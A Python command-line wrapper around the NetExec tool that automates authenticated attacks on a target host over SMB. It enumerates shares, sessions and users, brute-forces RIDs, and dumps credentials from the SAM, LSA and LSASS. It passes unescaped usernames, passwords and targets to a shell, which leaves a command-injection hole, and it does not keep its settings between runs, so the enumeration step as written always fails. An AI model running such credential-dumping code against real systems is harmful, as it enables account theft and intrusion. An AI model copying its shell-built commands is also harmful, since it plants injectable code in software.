#!/usr/bin/env python3
import argparse
import subprocess
import sys
from pathlib import Path
from datetime import datetime
from typing import List, Optional

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Logger:
    @staticmethod
    def section(text: str):
        print(f"\n{Colors.BOLD}{Colors.BLUE}{'=' * 50}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.BLUE}{text.center(50)}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.BLUE}{'=' * 50}{Colors.ENDC}\n")

    @staticmethod
    def subsection(text: str):
        print(f"\n{Colors.YELLOW}{'-' * 40}{Colors.ENDC}")
        print(f"{Colors.YELLOW}{text}{Colors.ENDC}")
        print(f"{Colors.YELLOW}{'-' * 40}{Colors.ENDC}\n")

    @staticmethod
    def command(cmd: str):
        print(f"{Colors.CYAN}[+] Executing: {cmd}{Colors.ENDC}\n")

    @staticmethod
    def success(text: str):
        print(f"{Colors.GREEN}[+] {text}{Colors.ENDC}")

    @staticmethod
    def error(text: str):
        print(f"{Colors.RED}[-] {text}{Colors.ENDC}")

    @staticmethod
    def info(text: str):
        print(f"{Colors.BLUE}[*] {text}{Colors.ENDC}")

class NetExecWrapper:
    def __init__(self):
        self.username = None
        self.password = None
        self.target = None
        self.start_time = None
        
    def execute_command(self, command: str, description: str) -> str:
        try:
            Logger.command(command)
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout if result.stdout else result.stderr
            
            if result.returncode == 0:
                if output.strip():
                    Logger.success(f"Successfully completed: {description}")
                else:
                    Logger.info("Command completed but no output returned")
            else:
                Logger.error(f"Command failed: {output}")
                
            return output
        except Exception as e:
            Logger.error(f"Error executing command: {str(e)}")
            return str(e)

    def set_config(self, param: str, value: str) -> str:
        if param == "username":
            self.username = value
            Logger.success(f"Username set to: {value}")
        elif param == "password":
            self.password = value
            Logger.success(f"Password set to: {'*' * len(value)}")
        elif param == "target":
            self.target = value
            Logger.success(f"Target set to: {value}")
        return f"Set {param} to: {value if param != 'password' else '*' * len(value)}"

    def enum(self, services: str) -> str:
        if not all([self.username, self.password, self.target]):
            Logger.error("Please set username, password, and target first")
            return

        self.start_time = datetime.now()
        Logger.section("Starting NetExec Enumeration")
        Logger.info(f"Start Time: {self.start_time}")
        Logger.info(f"Target: {self.target}")
        Logger.info(f"Username: {self.username}")
        Logger.info(f"Services: {services}")

        results = []
        services = services.split(',')
        
        for service in services:
            if service == "smb":
                Logger.subsection("SMB Enumeration")
                # Basic enumeration
                results.append(self.execute_command(
                    f"netexec smb {self.target} -u {self.username} -p {self.password}",
                    "Basic SMB enumeration"
                ))
                # Shares
                results.append(self.execute_command(
                    f"netexec smb {self.target} -u {self.username} -p {self.password} --shares",
                    "Share enumeration"
                ))
                # Sessions
                results.append(self.execute_command(
                    f"netexec smb {self.target} -u {self.username} -p {self.password} --sessions",
                    "Session enumeration"
                ))
            
            elif service == "users":
                Logger.subsection("User Enumeration")
                # Logged users
                results.append(self.execute_command(
                    f"netexec smb {self.target} -u {self.username} -p {self.password} --loggedon-users",
                    "Logged-on users enumeration"
                ))
                # Domain users
                results.append(self.execute_command(
                    f"netexec smb {self.target} -u {self.username} -p {self.password} --users",
                    "Domain users enumeration"
                ))
                # RID brute
                results.append(self.execute_command(
                    f"netexec smb {self.target} -u {self.username} -p {self.password} --rid-brute",
                    "RID bruteforce"
                ))
            
            elif service == "creds":
                Logger.subsection("Credential Dumping")
                # SAM dump
                results.append(self.execute_command(
                    f"netexec smb {self.target} -u {self.username} -p {self.password} --sam",
                    "SAM dump"
                ))
                # LSA dump
                results.append(self.execute_command(
                    f"netexec smb {self.target} -u {self.username} -p {self.password} --lsa",
                    "LSA dump"
                ))
                # LSASS dump
                results.append(self.execute_command(
                    f"netexec smb {self.target} -u {self.username} -p {self.password} -M lsassy",
                    "LSASS dump via lsassy"
                ))
            
            elif service == "spider":
                Logger.subsection("Share Spider")
                results.append(self.execute_command(
                    f"netexec smb {self.target} -u {self.username} -p {self.password} -M spider_plus",
                    "Share spidering"
                ))

            elif service == "policy":
                Logger.subsection("Password Policy")
                results.append(self.execute_command(
                    f"netexec smb {self.target} -u {self.username} -p {self.password} --pass-pol",
                    "Password policy enumeration"
                ))

        end_time = datetime.now()
        duration = end_time - self.start_time
        
        Logger.section("Enumeration Complete")
        Logger.info(f"Start Time: {self.start_time}")
        Logger.info(f"End Time: {end_time}")
        Logger.info(f"Duration: {duration}")
        
        return "\n".join(filter(None, results))

def main():
    parser = argparse.ArgumentParser(description=f'{Colors.BOLD}NetExec Wrapper - Enhanced Enumeration Tool{Colors.ENDC}')
    parser.add_argument('command', choices=['set', 'enum'])
    parser.add_argument('param', help='Parameter for set command or services for enum')
    parser.add_argument('value', help='Value for set command or target for enum')
    
    args = parser.parse_args()
    wrapper = NetExecWrapper()

    if args.command == 'set':
        if args.param in ['username', 'password', 'target']:
            print(wrapper.set_config(args.param, args.value))
        else:
            Logger.error(f"Unknown parameter: {args.param}")
    
    elif args.command == 'enum':
        services = args.param
        print(wrapper.enum(services))

if __name__ == "__main__":
    main()
